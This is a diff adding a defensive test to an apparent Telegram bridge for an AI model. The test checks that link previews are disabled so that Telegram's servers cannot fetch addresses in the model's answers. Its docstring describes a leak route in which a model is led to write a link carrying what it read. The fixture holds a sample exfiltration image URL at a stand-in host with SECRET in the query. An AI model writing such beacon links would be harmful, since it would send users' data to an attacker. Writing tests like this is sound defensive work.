@@ -79,3 +79,15 @@ def test_split_respects_telegram_limit_and_strips_local_images() -> None:
     assert len(chunks) >= 3 and all(len(c) <= tcb._MAX_TG_CHARS for c in chunks)
     stripped = tcb._strip_local_image_refs("here you go\n![a](file:///Users/x/r.png)\nenjoy")
     assert "file://" not in stripped and "here you go" in stripped and "enjoy" in stripped
+
+
+def test_an_answer_never_lets_telegram_fetch_its_links(monkeypatch, tmp_path) -> None:
+    """Telegram's servers fetch the first link in a message to draw a preview: an address the model
+    was led to write, with what it read put in the address, would leave with no tap (security
+    review 2026-11-13). The answer keeps the link; the preview is off."""
+    b, sent, replies = _bridge(monkeypatch, tmp_path, pinned="5")
+    replies["summarise it"] = "Done. ![chart](https://beacon.invalid/q.gif?d=SECRET)"
+    b.handle_update(_msg(5, "summarise it", 1))
+    answers = [d for m, d in sent if m == "sendMessage"]
+    assert answers and any("beacon.invalid" in d["text"] for d in answers)
+    assert all(d.get("link_preview_options") == {"is_disabled": True} for d in answers), answers
